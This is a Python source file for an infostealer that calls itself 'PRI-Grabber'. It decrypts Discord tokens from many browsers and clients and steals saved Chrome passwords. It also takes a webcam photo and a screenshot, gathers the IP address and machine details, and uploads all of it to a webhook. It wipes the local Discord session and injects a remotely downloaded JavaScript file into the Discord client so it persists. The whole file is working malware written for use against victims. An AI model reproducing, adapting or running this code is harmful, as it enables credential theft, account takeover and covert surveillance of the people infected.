from base64 import b64decode

from Crypto.Cipher import AES

from win32crypt import CryptUnprotectData

from os import getlogin, listdir

from json import loads

from re import findall

from urllib.request import Request, urlopen

from subprocess import Popen, PIPE

import requests, json, os

from datetime import datetime

from zipfile import ZipFile

import os 

import json 

import base64 

import sqlite3 

import win32crypt 

from Crypto.Cipher import AES  #Works

import shutil 

from datetime import timezone, datetime, timedelta 

from PIL import ImageGrab

import time

import httpx

import cv2

import glob

import subprocess



tokens = []

cleaned = []

checker = []

webhook_url = "%webhook_url%"



userprofile = os.getenv('USERPROFILE')

local_app_data_path = os.environ['LOCALAPPDATA']

app_data_path = os.environ['APPDATA']

def inject_into_discord():


    # Pfad zum Discord-Sitzungsordner
    discord_session_path = os.path.join(os.environ['APPDATA'], 'Discord')

    # Löschen aller Dateien im Discord-Sitzungsordner
    for file in os.listdir(discord_session_path):
        file_path = os.path.join(discord_session_path, file)
        try:
            if os.path.isfile(file_path):
                os.unlink(file_path)
        except Exception as e:
            print(f"Fehler beim Löschen der Datei {file_path}: {e}")

    print("Sitzungsdaten wurden gelöscht. Sie müssen sich erneut bei Discord anmelden.")

    path = fr'{local_app_data_path}\Discord\*\modules\discord_desktop_core-*\discord_desktop_core'



    matching_folders = glob.glob(path)



    url = 'https://raw.githubusercontent.com/Paloox/discordInjectionFile/main/injection.js'

    response = requests.get(url)

    

    file_content = response.text



    if matching_folders:

        target_folder = matching_folders[0]

        new_file_path = os.path.join(target_folder, 'index.js')

        with open(new_file_path, 'w') as file:

            file.write(file_content)



        search_text = "%WEBHOOK_URL_INJECT%"

        replace_text = webhook_url

        with open(new_file_path, 'r') as file:

            data = file.read()

            data = data.replace(search_text, replace_text)



        with open(new_file_path, 'w') as file:

            file.write(data)

        





def start_discord():

    subprocess.Popen(fr"{local_app_data_path}\Discord\Update.exe --processStart Discord.exe", shell=True)





def kill_discord():

    subprocess.Popen("taskkill /F /IM Discord.exe", shell=True)





def decrypt(buff, master_key):

    try:

        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()

    except:

        return "Error"

def getip():

    ip = "None"

    try:

        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()

    except: pass

    return ip

def gethwid():

    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)

    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def get_token():

    already_check = []

    checker = []

    local = os.getenv('LOCALAPPDATA')

    roaming = os.getenv('APPDATA')

    chrome = local + "\\Google\\Chrome\\User Data"

    paths = {

        'Discord': roaming + '\\discord',

        'Discord Canary': roaming + '\\discordcanary',

        'Lightcord': roaming + '\\Lightcord',

        'Discord PTB': roaming + '\\discordptb',

        'Opera': roaming + '\\Opera Software\\Opera Stable',

        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',

        'Amigo': local + '\\Amigo\\User Data',

        'Torch': local + '\\Torch\\User Data',

        'Kometa': local + '\\Kometa\\User Data',

        'Orbitum': local + '\\Orbitum\\User Data',

        'CentBrowser': local + '\\CentBrowser\\User Data',

        '7Star': local + '\\7Star\\7Star\\User Data',

        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',

        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',

        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',

        'Chrome': chrome + 'Default',

        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',

        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',

        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',

        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',

        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',

        'Iridium': local + '\\Iridium\\User Data\\Default'

    }

    for platform, path in paths.items():

        if not os.path.exists(path): continue

        try:

            with open(path + f"\\Local State", "r") as file:

                key = loads(file.read())['os_crypt']['encrypted_key']

                file.close()

        except: continue

        for file in listdir(path + f"\\Local Storage\\leveldb\\"):

            if not file.endswith(".ldb") and file.endswith(".log"): continue

            else:

                try:

                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:

                        for x in files.readlines():

                            x.strip()

                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):

                                tokens.append(values)

                except PermissionError: continue

        for i in tokens:

            if i.endswith("\\"):

                i.replace("\\", "")

            elif i not in cleaned:

                cleaned.append(i)

        for token in cleaned:

            try:

                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])

            except IndexError == "Error": continue

            checker.append(tok)

            for value in checker:

                if value not in already_check:

                    already_check.append(value)

                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}

                    try:

                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)

                    except: continue

                    if res.status_code == 200:

                        res_json = res.json()

                        ip = getip()

                        pc_username = os.getenv("UserName")

                        pc_name = os.getenv("COMPUTERNAME")

                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'

                        user_id = res_json['id']

                        email = res_json['email']

                        phone = res_json['phone']

                        mfa_enabled = res_json['mfa_enabled']

                        has_nitro = False

                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)

                        nitro_data = res.json()

                        has_nitro = bool(len(nitro_data) > 0)

                        days_left = 0

                        if has_nitro:

                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")

                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")

                            days_left = abs((d2 - d1).days)





                        file_path = r"C:\Users\pkuhn\Desktop\discord\Download.jpg"

                        embed = {

                            'username': 'Yurr',

                            'avatar_url': 'https://i1.sndcdn.com/artworks-bIWl7GVWfietauul-M47WpQ-t500x500.jpg',

                            'embeds': [

                                {

                                    'author': {

                                        'name': f'{user_name} ({user_id}) opened PRI-Grabber',

                                        'icon_url': 'https://i1.sndcdn.com/artworks-bIWl7GVWfietauul-M47WpQ-t500x500.jpg'

                                    },

                                    'color': 16119101,

                                    'fields': [

                                        {

                                            'name': '\u200b',

                                            'value': f'''```fix

                                                Email: {email}

                                                Phone: {phone}

                                                2FA/MFA Enabled:  {mfa_enabled}

                                                Nitro: {has_nitro}

                                                Expires in: {days_left if days_left else 'None'}

                                            ```''',

                                            'inline': True

                                        },

                                        {

                                            'name': '\u200b',

                                            'value': f'''```fix

                                                IP: {ip}

                                                PCName: {pc_name}

                                                Username: {pc_username}

                                                Platform:᠎ {platform}

                                            ```''',

                                            'inline': True

                                        },

                                        {

                                            'name': '**Token:**',

                                            'value': f'```{tok}```',

                                            'inline': False

                                        },

                                    ],

                                }

                            ]

                        }







                        try:

                            headers2 = {

                                'Content-Type': 'application/json',

                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'

                            }

                            username = 'PRI-Grabber'

                            





                            cam = cv2.VideoCapture(0)

                            frame = cam.read()[1]

                            cv2.imwrite(f'{userprofile}\\webcamPic.png', frame)

                                





                            with open(f'{userprofile}\\discordInfo.txt', 'a') as file: 

                                file.write(f'Email: {email}\n')

                                file.write(f'Phone: {phone}\n')

                                file.write(f'2FA/MFA Enabled:  {mfa_enabled}\n')

                                file.write(f'Nitro: {has_nitro}\n')

                                file.write(f'Expires in: {days_left if days_left else 'None'}\n')

                                file.write(f'Token: {tok}\n')

                                file.write("=" * 100 + "\n")



                            with open(f'{userprofile}\\pcInfo.txt', 'a') as file:

                                file.write(f'IP: {ip}\n')

                                file.write(f'PCName: {pc_name}\n')

                                file.write(f'Username: {pc_username}\n')

                                file.write("=" * 100 + "\n")





                            name = os.getenv("UserName")



                            with ZipFile(f'{userprofile}\\{name}.zip', 'w') as zip_object:





                                if(os.path.isfile(f'{userprofile}\\passwords.txt')):

                                    zip_object.write(f'{userprofile}\\passwords.txt')



                                if(os.path.isfile(f'{userprofile}\\pcInfo.txt')):

                                    zip_object.write(f'{userprofile}\\pcInfo.txt')



                                if(os.path.isfile(f'{userprofile}\\discordInfo.txt')):

                                    zip_object.write(f'{userprofile}\\discordInfo.txt')







                            payload = json.dumps({'username': username, 'embeds': [embed]})





                            screenshot = ImageGrab.grab()

                            screenshot.save(f"{userprofile}\\screenshot.png")

                            screenshot.close()



                            

                            httpx.post(webhook_url, json=embed)



                            file = {'file': (f'{userprofile}\\{pc_username}.zip', open(f'{userprofile}\\{pc_username}.zip', 'rb'), 'application/zip')}

                            requests.post(webhook_url, files=file)

                            file = {'file': (f'{userprofile}\\screenshot.png', open(f'{userprofile}\\screenshot.png', 'rb'), 'image/png')}

                            requests.post(webhook_url, files=file)



                            if(os.path.isfile(f'{userprofile}\\webcamPic.png')):

                                file = {'file': (f'{userprofile}\\webcamPic.png', open(f'{userprofile}\\webcamPic.png', 'rb'), 'image/png')}

                                requests.post(webhook_url, files=file)

                            

                            time.sleep(1)

                            os.remove(f"{userprofile}\\screenshot.png")

                            os.remove(f"{userprofile}\\passwords.txt") 

                            name = os.getenv("UserName")

                            os.remove(f"{userprofile}\\{name}.zip") 

                            os.remove(f"{userprofile}\\discordInfo.txt")

                            os.remove(f"{userprofile}\\pcInfo.txt")

                            os.remove(f"{userprofile}\\webcamPic.png")

                            

                        except: continue



                else: continue



def chrome_date_and_time(chrome_data): 



    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data) 

  

  

def fetching_encryption_key(): 



    local_computer_directory_path = os.path.join( 

      os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",  

      "User Data", "Local State") 

      

    with open(local_computer_directory_path, "r", encoding="utf-8") as f: 

        local_state_data = f.read() 

        local_state_data = json.loads(local_state_data) 



    encryption_key = base64.b64decode( 

      local_state_data["os_crypt"]["encrypted_key"]) 

      



    encryption_key = encryption_key[5:] 

      

 

    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1] 

  

  

def password_decryption(password, encryption_key): 

    try: 

        iv = password[3:15] 

        password = password[15:] 



        cipher = AES.new(encryption_key, AES.MODE_GCM, iv) 



        return cipher.decrypt(password)[:-16].decode() 

    except: 

          

        try: 

            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]) 

        except: 

            return "No Passwords"

  

  

def main(): 

    key = fetching_encryption_key() 

    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", 

                           "Google", "Chrome", "User Data", "default", "Login Data") 

    filename = f"{userprofile}\\ChromePasswords.db"

    shutil.copyfile(db_path, filename) 

      

    db = sqlite3.connect(filename) 

    cursor = db.cursor() 

      



    cursor.execute( 

        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "

        "order by date_last_used") 

      



    for row in cursor.fetchall(): 

        main_url = row[0] 

        login_page_url = row[1] 

        user_name = row[2] 

        decrypted_password = password_decryption(row[3], key) 

        date_of_creation = row[4] 

        last_usuage = row[5] 

          

        if user_name or decrypted_password: 



            with open(f"{userprofile}\\passwords.txt", "a") as file:

                file.write(f"Main URL: {main_url}\n") 

                file.write(f"Login URL: {login_page_url}\n")

                file.write(f"User name: {user_name}\n") 

                file.write(f"Decrypted Password: {decrypted_password}\n") 

          

        else: 

            continue

          

        if date_of_creation != 86400000000 and date_of_creation: 

            with open(f"{userprofile}\\passwords.txt", "a") as file:

                file.write(f"Creation date: {str(chrome_date_and_time(date_of_creation))}\n")

          

        if last_usuage != 86400000000 and last_usuage: 

            with open(f"{userprofile}\\passwords.txt", "a") as file:

                file.write(f"Last Used: {str(chrome_date_and_time(last_usuage))}\n")  

        with open(f"{userprofile}\\passwords.txt", "a") as file:

            file.write("=" * 100 + "\n")

    cursor.close() 

    db.close() 

    



    try: 



        os.remove(f"{userprofile}\\ChromePasswords.db") 

    except: 

        pass

  

  
kill_discord()

main()

get_token()

kill_discord()

inject_into_discord()

start_discord()


